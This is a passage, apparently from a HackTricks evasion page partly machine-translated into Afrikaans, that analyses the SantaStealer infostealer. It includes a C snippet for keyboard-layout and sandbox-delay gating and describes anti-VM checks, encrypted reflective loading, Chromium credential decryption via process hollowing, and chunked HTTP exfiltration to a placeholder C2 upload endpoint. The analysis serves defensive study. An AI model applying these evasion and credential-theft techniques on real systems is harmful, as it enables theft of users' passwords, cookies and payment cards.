- Image‑load ontwyking: as hooking LoadLibrary*, moniteer verdagte laaie van automation/clr assemblies wat met memory masking events gekorreleer is.

Related building blocks and examples
- Reflective loaders wat IAT-patching tydens laai uitvoer (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) en stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustreer hoe moderne info-stealers AV bypass, anti-analysis en credential access in 'n enkele workflow saamsmelt.

### Keyboard layout gating & sandbox delay

- 'n Config flag (`anti_cis`) enumereer geïnstalleerde keyboard layouts via `GetKeyboardLayoutList`. As 'n Cyrillic layout gevind word, laat die sample 'n leë `CIS` marker val en beëindig voordat dit stealers uitvoer, wat verseker dat dit nooit op uitgeslote lokale ontplof nie terwyl dit 'n hunting artifact agterlaat.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Gelaagde `check_antivm` logika

- Variant A deurloop die proseslys, hasj elke naam met 'n pasgemaakte rolling checksum, en vergelyk dit teen ingebedde blocklists vir debuggers/sandboxes; dit herhaal die checksum oor die rekenaam en kontroleer werkgidse soos `C:\analysis`.
- Variant B inspekteer stelsel-eienskappe (process-count floor, recent uptime), roep `OpenServiceA("VBoxGuest")` om VirtualBox additions te ontdek, en voer timing checks rondom sleeps uit om single-stepping op te spoor. Enige treffers breek af voordat modules begin.

### Fileless helper + double ChaCha20 reflective loading

- Die primêre DLL/EXE embed 'n Chromium credential helper wat óf na skyf gedruppel word of handmatig in-memory gemapped word; fileless mode los imports/relocations self op sodat geen helper-artefakte geskryf word nie.
- Daardie helper stoor 'n tweede-fase DLL wat twee keer met ChaCha20 geïnkripteer is (twee 32-byte sleutels + 12-byte nonces). Na albei passe laai dit die blob reflectively (geen `LoadLibrary`) en roep exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` afgeleid van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Die ChromElevator-roetines gebruik direct-syscall reflective process hollowing om in 'n lewende Chromium browser in te voeg, erf AppBound Encryption sleutels, en dekripteer passwords/cookies/credit cards direk uit SQLite databases ondanks ABE hardening.


### Modulêre in-memory versameling & chunked HTTP exfil

- `create_memory_based_log` iterereer 'n globale `memory_generators` function-pointer tabel en spawn een thread per geaktiveerde module (Telegram, Discord, Steam, screenshots, documents, browser extensions, ens.). Elke thread skryf resultate na gedeelde buffers en rapporteer sy file count na 'n ~45s join window.
- Sodra klaar, word alles gezip met die staties gekoppelde `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` slaap dan 15s en stroom die argief in 10 MB chunks via HTTP POST na `http://<C2>:6767/upload`, spoofing 'n browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Elke chunk voeg `User-Agent: upload`, `auth: <build_id>`, opsionele `w: <campaign_tag>` by, en die laaste chunk heg `complete: true` sodat die C2 weet dat herassameling voltooi is.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
